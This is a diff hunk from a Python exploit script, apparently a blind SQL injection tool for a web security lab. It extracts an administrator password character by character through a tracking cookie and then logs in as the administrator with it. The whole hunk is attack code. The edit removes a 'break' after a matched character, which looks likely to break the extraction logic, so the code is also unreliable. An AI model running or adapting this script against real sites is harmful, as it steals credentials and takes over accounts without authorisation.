@@ -110,13 +110,12 @@ def extract_admin_password(url, tracking_id, session_id):
                 password_extracted += chr(ascii_value)
                 sys.stdout.write('\r' + password_extracted)
                 sys.stdout.flush()
-                break
             else:
                 sys.stdout.write('\r' + password_extracted + chr(ascii_value))
                 sys.stdout.flush()
             
             # If the password length reaches 20, display the complete password and attempt to log in
-            if len(password_extracted) >= 20:
+            if len(password_extracted) == 20:
                 print(f"\n[+] The administrator password is: {password_extracted}")
                 # Attempt to log in as the administrator
                 if login_as_admin(requests.Session(), url + "/login", password_extracted):
